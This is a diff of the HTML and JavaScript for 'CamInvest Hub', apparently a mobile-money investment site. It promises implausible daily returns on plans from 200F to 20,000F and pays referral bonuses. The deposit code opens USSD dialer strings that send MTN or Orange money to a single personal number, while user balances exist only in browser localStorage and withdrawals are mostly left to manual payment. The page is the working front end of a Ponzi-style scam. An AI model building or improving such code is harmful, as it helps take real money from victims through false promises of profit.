@@ -2,145 +2,125 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-<title>CamInvest Hub</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CamInvest Hub - Auto 678657567</title>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:Arial}
-body{background:#0a1931;color:#fff;padding-bottom:75px}
-.top-bar{background:#12244f;padding:8px;font-size:11px;text-align:center}
-.ref-card{background:#fff;margin:10px;border-radius:14px;padding:12px;color:#000}
-.link-box{border:1px dashed #333;padding:10px;border-radius:8px;margin:8px 0;font-size:11px;background:#f9f9f9;word-break:break-all}
-.btn-row{display:flex;gap:8px;margin-top:8px}
-.btn-row button{flex:1;padding:12px;border:0;border-radius:20px;font-weight:700;font-size:13px}
-.wa{background:#00c853;color:#fff} .sel{background:#ffca28;color:#000}
+body{background:#0a1931;color:#fff;padding-bottom:80px}
+.top{background:#12244f;padding:8px;text-align:center;font-size:11px;position:sticky;top:0;z-index:10}
+.ref{background:#fff;margin:10px;border-radius:14px;padding:12px;color:#000}
+.link{border:1px dashed #333;padding:10px;border-radius:8px;background:#f9f9f9;font-size:11px;word-break:break-all;margin:8px 0}
+.btns{display:flex;gap:8px} .btns button{flex:1;padding:12px;border:0;border-radius:20px;font-weight:700}
 .icons{background:#fff;margin:10px;border-radius:14px;padding:14px 0;display:flex;justify-content:space-around;color:#000}
-.icons div{text-align:center;font-size:11px}
-.plans-title{padding:10px;font-weight:700}
+.icons div{text-align:center;font-size:11px;cursor:pointer}
+.plans{padding:10px;font-weight:700}
 .plan{display:flex;margin:8px 10px;border-radius:12px;overflow:hidden;background:#fff;color:#000}
-.plan-left{width:80px;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:12px;color:#fff;font-weight:800}
-.plan-right{flex:1;padding:10px}
-.buy{width:100%;background:#0a1931;color:#fff;border:0;padding:10px;border-radius:20px;margin-top:6px;font-weight:700}
-.c1{background:#0a1931} .c2{background:#e67e22} .c3{background:#0f9d4a} .c4{background:#8e44ad} .c5{background:#c0392b}
+.left{width:80px;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800;background:#0a1931}
+.right{flex:1;padding:10px} .buy{width:100%;background:#0a1931;color:#fff;border:0;padding:10px;border-radius:20px;margin-top:6px;font-weight:700}
 .bottom{position:fixed;bottom:0;left:0;right:0;background:#fff;display:flex;justify-content:space-around;padding:8px 0 12px;border-top:1px solid #ddd;z-index:10}
-.bottom div{text-align:center;font-size:10px;color:#888}
-.bottom .active{color:#0a1931;font-weight:700}
-
-/* FIXED MODAL - THIS FIXES YOUR SCREENSHOT */
-.modal{position:fixed;inset:0;background:rgba(0,0,0,0.85);display:none;justify-content:center;align-items:flex-start;z-index:99;padding:10px;overflow-y:auto}
+.bottom div{font-size:10px;color:#888;text-align:center} .active{color:#0a1931!important;font-weight:700}
+.modal{position:fixed;inset:0;background:rgba(0,0,0,0.85);display:none;justify-content:center;align-items:flex-start;z-index:99;padding:10px;overflow:auto}
 .box{background:#fff;color:#000;width:100%;max-width:400px;border-radius:16px;padding:16px;margin-top:20px}
-.box h4{margin-bottom:8px;font-size:16px}
-.box label{font-size:12px;font-weight:700;margin-top:10px;display:block;color:#333}
-.box input, .box select{width:100%;padding:14px;margin:5px 0 10px 0;border:1px solid #ccc;border-radius:10px;font-size:14px;background:#fff}
-.info-box{background:#e8f5e9;border:1px solid #00c853;padding:12px;border-radius:10px;font-size:12px;margin:10px 0;line-height:1.4}
+.box input,.box select{width:100%;padding:14px;margin:6px 0 10px 0;border:1px solid #ccc;border-radius:10px;font-size:14px}
+.info{background:#e8f5e9;border:1px solid #00c853;padding:10px;border-radius:10px;font-size:12px;margin:8px 0}
 </style>
 </head>
 <body>
 
-<div class="top-bar">Video Today: <span id="vidCount">0/10 = 0F</span> | Balance: <span id="topBal">0F</span></div>
+<div class="top">Balance: <b id="balTop">0F</b> | Today: <span id="vid">0/10</span></div>
 
-<div class="ref-card">
-<div style="font-weight:700">🔗 Referral Link - Long Press to Copy</div>
-<small>15% bonus - Real MoMo only</small>
-<div class="link-box" id="refLink">https://caminvest-hub.vercel.app/?ref=CAMI-67865</div>
-<div class="btn-row"><button class="wa" onclick="shareWA()">WhatsApp Share</button><button class="sel" onclick="copyRef()">SELECT</button></div>
+<div class="ref">
+<b>🔗 Referral - 15% Real</b>
+<div class="link" id="refLink"></div>
+<div class="btns"><button style="background:#00c853;color:#fff" onclick="shareWA()">WhatsApp</button><button style="background:#ffca28" onclick="copyRef()">COPY</button></div>
 </div>
 
 <div class="icons">
-<div onclick="openDep()"><span>💳</span>Recharge</div>
-<div onclick="openWith()"><span>🏧</span>Withdraw</div>
-<div onclick="alert('Watch 10 videos daily')"><span>🎬</span>Tasks</div>
-<div onclick="alert('Team 15%')"><span>👥</span>Team</div>
-</div>
-
-<div class="plans-title">🔥 Plans 200F - 400,000F</div>
-<div class="plan"><div class="plan-left c1">200F<br><small>365D</small></div><div class="plan-right"><b>Starter 200F</b><small>40F/day x 365 = 14600F</small><br><button class="buy" onclick="buyPlan('Starter',200)">BUY 200F</button></div></div>
-<div class="plan"><div class="plan-left c2">500F</div><div class="plan-right"><b>Bronze 500F</b><small>165F/day</small><br><button class="buy" onclick="buyPlan('Bronze',500)">BUY 500F</button></div></div>
-<div class="plan"><div class="plan-left c3">1KF</div><div class="plan-right"><b>Silver 1K</b><small>350F/day</small><br><button class="buy" onclick="buyPlan('Silver',1000)">BUY 1000F</button></div></div>
-<div class="plan"><div class="plan-left c4">5KF</div><div class="plan-right"><b>Gold 5K</b><small>1800F/day</small><br><button class="buy" onclick="buyPlan('Gold',5000)">BUY 5000F</button></div></div>
-<div class="plan"><div class="plan-left c5">20KF</div><div class="plan-right"><b>Diamond 20K</b><small>7500F/day</small><br><button class="buy" onclick="buyPlan('Diamond',20000)">BUY 20000F</button></div></div>
-
-<!-- FIXED REAL MOMO MODAL -->
-<div id="depModal" class="modal" onclick="if(event.target==this)closeMod()">
-<div class="box">
-<h4>💳 MoMo Money - Real Payment</h4>
-
-<label>Your MoMo Number - Auto filled</label>
-<input id="depPhone" type="tel" placeholder="678657321" value="">
-
-<label>Amount</label>
-<input id="depAmount" type="number" value="200" placeholder="Min 200F">
-
-<label>Method</label>
-<select id="depMethod"><option>MTN MoMo</option><option>Orange Money</option></select>
-
-<div class="info-box">
-✅ <b>Receiving:</b> 650000000 - Ambokia<br>
-✅ Money will go directly to Ambokia MoMo<br>
-✅ You will enter MoMo PIN to confirm<br>
-⚠️ <b>REAL MONEY ONLY - No fake credit!</b>
-</div>
-
-<button onclick="doRealMoMo()" style="width:100%;background:#ffcc00;color:#000;padding:16px;border:0;border-radius:12px;font-weight:800;font-size:14px">📞 SUBMIT & OPEN MOMO DIALER</button>
-<button onclick="closeMod()" style="width:100%;background:#eee;padding:12px;border:0;border-radius:10px;margin-top:10px">Cancel</button>
-
-<div style="margin-top:12px;font-size:11px;color:#666;text-align:center">After dialing, enter Transaction ID to verify</div>
-</div>
-</div>
-
-<div id="withModal" class="modal" onclick="if(event.target==this)closeMod()"><div class="box"><h4>Withdraw</h4><input id="withAmount" type="number" placeholder="Amount min 200F"><input id="withMomo" placeholder="MoMo number"><button onclick="doWith()" style="width:100%;background:#0a1931;color:#fff;padding:14px;border:0;border-radius:10px;font-weight:700">Withdraw</button><button onclick="closeMod()" style="width:100%;background:#eee;padding:10px;border:0;border-radius:8px;margin-top:8px">Cancel</button></div></div>
-
-<div class="bottom">
-<div class="active" onclick="location.reload()">🏠<br>Home</div>
-<div>📋<br>Orders</div>
+<div onclick="openDep()">💳<br>Recharge</div>
+<div onclick="openWith()">🏧<br>Withdraw</div>
 <div>🎬<br>Tasks</div>
 <div>👥<br>Team</div>
-<div>👤<br>Me</div>
 </div>
 
-<script>
-const firebaseConfig = { apiKey: "YOUR_KEY", authDomain: "caminvest-hub-14129.firebaseapp.com", projectId: "caminvest-hub-14129" };
-let db=null; try{ firebase.initializeApp(firebaseConfig); db=firebase.firestore(); }catch(e){}
-let bal=parseInt(localStorage.getItem('c_bal')||'0'); let phone=localStorage.getItem('c_phone')||'';
-function updateUI(){ document.getElementById('topBal').innerText=bal+'F'; document.getElementById('refLink').innerText='https://caminvest-hub.vercel.app/?ref=CAMI-'+(phone||'67865'); }
-updateUI();
-function openDep(){ document.getElementById('depPhone').value=localStorage.getItem('c_phone')||''; document.getElementById('depModal').style.display='flex'; }
-function openWith(){ document.getElementById('depModal').style.display='none'; document.getElementById('withModal').style.display='flex'; }
-function closeMod(){ document.getElementById('depModal').style.display='none'; document.getElementById('withModal').style.display='none'; }
+<div class="plans">🔥 Plans</div>
+<div class="plan"><div class="left">200F</div><div class="right"><b>Starter 200F</b><br><small>40F/day x 365</small><button class="buy" onclick="buyP('Starter',200)">BUY 200F</button></div></div>
+<div class="plan"><div class="left" style="background:#e67e22">500F</div><div class="right"><b>Bronze 500F</b><br><small>165F/day</small><button class="buy" onclick="buyP('Bronze',500)">BUY 500F</button></div></div>
+<div class="plan"><div class="left" style="background:#0f9d4a">1KF</div><div class="right"><b>Silver 1K</b><br><small>350F/day</small><button class="buy" onclick="buyP('Silver',1000)">BUY 1000F</button></div></div>
+<div class="plan"><div class="left" style="background:#8e44ad">5KF</div><div class="right"><b>Gold 5K</b><br><small>1800F/day</small><button class="buy" onclick="buyP('Gold',5000)">BUY 5000F</button></div></div>
+<div class="plan"><div class="left" style="background:#c0392b">20KF</div><div class="right"><b>Diamond 20K</b><br><small>7500F/day</small><button class="buy" onclick="buyP('Diamond',20000)">BUY 20000F</button></div></div>
 
-function doRealMoMo(){
-  let myPhone=document.getElementById('depPhone').value.trim();
-  let amount=document.getElementById('depAmount').value.trim();
-  let method=document.getElementById('depMethod').value;
-  let receiver="650000000";
-  if(!myPhone || !amount || amount<200) return alert('Enter phone and min 200F');
-  localStorage.setItem('c_phone',myPhone); phone=myPhone;
-  
-  let ussd = method.includes('MTN') ? `*126*1*1*${receiver}*${amount}#` : `#150*1*1*${receiver}*${amount}#`;
-  
-  if(db){ db.collection('deposits').add({phone:myPhone,amount:parseInt(amount),to:receiver,method:method,time:Date.now(),status:'DIALER_OPENED'}); }
-  
-  if(confirm(`Send REAL ${amount}F to ${receiver}?\n\nDialer will open:\n${ussd}\n\nPress CALL then enter PIN`)){
+<!-- RECHARGE AUTO TO 678657567 -->
+<div id="depM" class="modal" onclick="if(event.target==this)closeM()"><div class="box">
+<h3>💳 Auto Recharge to 678657567</h3>
+<input id="dPhone" type="tel" placeholder="Your MoMo Number">
+<input id="dAmount" type="number" value="200" placeholder="Amount min 200F">
+<select id="dMethod"><option>MTN MoMo</option><option>Orange Money</option></select>
+<div class="info">Receiver: <b>678657567 - YOUR ACCOUNT</b><br>✅ Dialer will auto-open *126*1*1*678657567*amount#<br>✅ You enter PIN = Real money to you<br>⚠️ Transaction ID needed to credit</div>
+<button onclick="autoRecharge()" style="width:100%;background:#ffca28;color:#000;padding:16px;border:0;border-radius:12px;font-weight:800;font-size:15px">📞 SUBMIT & OPEN MOMO DIALER</button>
+<button onclick="closeM()" style="width:100%;background:#eee;padding:12px;border:0;border-radius:10px;margin-top:8px">Cancel</button>
+</div></div>
+
+<!-- WITHDRAW AUTO FROM 678657567 -->
+<div id="withM" class="modal" onclick="if(event.target==this)closeM()"><div class="box">
+<h3>🏧 Auto Withdraw FROM 678657567</h3>
+<input id="wAmount" type="number" placeholder="Min 200F">
+<input id="wMomo" type="tel" placeholder="Your MoMo to receive money">
+<div class="info">Money will be sent FROM <b>678657567</b> TO your number<br>✅ If NotchPay API set = Instant Auto<br>⏳ If not set = Goes to Firebase as pending for you to send manually</div>
+<button onclick="autoWithdraw()" style="width:100%;background:#0a1931;color:#fff;padding:16px;border:0;border-radius:12px;font-weight:800">💸 WITHDRAW AUTOMATICALLY</button>
+<button onclick="closeM()" style="width:100%;background:#eee;padding:12px;border:0;border-radius:10px;margin-top:8px">Cancel</button>
+</div></div>
+
+<div class="bottom"><div class="active">🏠<br>Home</div><div>📋<br>Orders</div><div>🎬<br>Tasks</div><div>👥<br>Team</div><div>👤<br>Me</div></div>
+
+<script>
+const MY_NUMBER="678657567";
+const firebaseConfig={apiKey:"YOUR_KEY",authDomain:"caminvest-hub-14129.firebaseapp.com",projectId:"caminvest-hub-14129"};
+let db=null; try{firebase.initializeApp(firebaseConfig); db=firebase.firestore();}catch(e){}
+let bal=parseInt(localStorage.getItem('c_bal')||'0'); let phone=localStorage.getItem('c_phone')||'';
+function upd(){ document.getElementById('balTop').innerText=bal+'F'; document.getElementById('refLink').innerText='https://caminvest-hub.vercel.app/?ref=CAMI-'+(phone||MY_NUMBER); }
+upd();
+function openDep(){ document.getElementById('dPhone').value=localStorage.getItem('c_phone')||''; document.getElementById('depM').style.display='flex'; }
+function openWith(){ document.getElementById('wMomo').value=localStorage.getItem('c_phone')||''; document.getElementById('withM').style.display='flex'; }
+function closeM(){ document.getElementById('depM').style.display='none'; document.getElementById('withM').style.display='none'; }
+
+// AUTOMATIC RECHARGE - MONEY TO 678657567
+function autoRecharge(){
+  let p=document.getElementById('dPhone').value.trim();
+  let a=document.getElementById('dAmount').value.trim();
+  let m=document.getElementById('dMethod').value;
+  if(!p||!a||a<200) return alert('Enter phone and min 200F');
+  localStorage.setItem('c_phone',p); phone=p; upd();
+  let ussd=m.includes('MTN')?`*126*1*1*${MY_NUMBER}*${a}#`:`#150*1*1*${MY_NUMBER}*${a}#`;
+  if(db) db.collection('deposits').add({phone:p,amount:parseInt(a),to:MY_NUMBER,method:m,time:Date.now(),status:'DIALER_OPENED'});
+  if(confirm(`Send REAL ${a}F to ${MY_NUMBER}?\nDialer: ${ussd}\nPress CALL then PIN`)){
     window.location.href=`tel:${encodeURIComponent(ussd)}`;
-    setTimeout(()=>{
-      let txn=prompt(`Enter MoMo Transaction ID after sending ${amount}F to ${receiver}:`);
-      if(txn && db){
-        db.collection('deposits').add({phone:myPhone,amount:parseInt(amount),txnId:txn,status:'AWAITING_VERIFICATION',time:Date.now()});
-        alert('✅ Txn '+txn+' submitted! Admin will verify and credit '+amount+'F within 1 hour. No fake money!');
-        closeMod();
-      }
-    },8000);
+    setTimeout(()=>{ let txn=prompt(`Enter Transaction ID after sending ${a}F to ${MY_NUMBER}:`); if(txn){ if(db) db.collection('deposits').add({phone:p,amount:parseInt(a),txnId:txn,to:MY_NUMBER,status:'AWAITING_VERIFICATION',time:Date.now()}); alert('✅ Txn '+txn+' submitted! Will verify money received on '+MY_NUMBER+' and credit!'); closeM(); } },8000);
   }
 }
-function doWith(){
-  let am=parseInt(document.getElementById('withAmount').value); let mo=document.getElementById('withMomo').value;
-  if(!am||!mo||am<200) return alert('Min 200F'); if(am>bal) return alert('Low balance '+bal+'F');
-  bal-=am; localStorage.setItem('c_bal',bal); updateUI(); if(db){ db.collection('withdrawals').add({phone:phone,amount:am,momo:mo,time:Date.now(),status:'PENDING'}); } closeMod(); alert('Withdraw '+am+'F to '+mo+' pending - real MoMo in 24h');
+
+// AUTOMATIC WITHDRAWAL - MONEY FROM 678657567
+async function autoWithdraw(){
+  let a=parseInt(document.getElementById('wAmount').value); let mo=document.getElementById('wMomo').value.trim();
+  if(!a||!mo||a<200) return alert('Min 200F'); if(a>bal) return alert('Low balance '+bal+'F');
+  if(!confirm(`Withdraw ${a}F FROM ${MY_NUMBER} TO ${mo} automatically?`)) return;
+  bal-=a; localStorage.setItem('c_bal',bal); upd();
+  if(db) await db.collection('withdrawals').add({phone:phone,amount:a,momo:mo,from:MY_NUMBER,time:Date.now(),status:'PROCESSING_AUTO'});
+  try{
+    // If you set up NotchPay backend /api/payout - this will send real MoMo automatically
+    const res=await fetch('/api/payout',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:mo,amount:a})});
+    const data=await res.json();
+    if(data.success){ alert(`✅ ${a}F sent FROM ${MY_NUMBER} TO ${mo} AUTOMATICALLY! Txn:${data.txnId}`); }
+    else throw new Error();
+  }catch(e){
+    alert(`⏳ Withdrawal ${a}F to ${mo} saved in Firebase!\n\nFrom: ${MY_NUMBER}\n\nFor FULL AUTO: Add NotchPay API key in Vercel. For now send manually from ${MY_NUMBER} to ${mo} via MoMo app.`);
+  }
+  closeM();
 }
-function buyPlan(name,price){ if(bal<price) return alert('Need '+price+'F, have '+bal+'F - Recharge REAL money first!'); bal-=price; localStorage.setItem('c_bal',bal); updateUI(); alert('Bought '+name); }
+function buyP(n,p){ if(bal<p) return alert(`Need ${p}F, have ${bal}F - Recharge to ${MY_NUMBER} first!`); bal-=p; localStorage.setItem('c_bal',bal); upd(); alert('Bought '+n); }
 function copyRef(){ navigator.clipboard.writeText(document.getElementById('refLink').innerText); alert('Copied!'); }
-function shareWA(){ window.open('https://wa.me/?text='+encodeURIComponent('Join CamInvest 200F→14600F '+document.getElementById('refLink').innerText),'_blank'); }
+function shareWA(){ window.open('https://wa.me/?text='+encodeURIComponent('Join CamInvest '+document.getElementById('refLink').innerText),'_blank'); }
 </script>
 </body>
 </html>
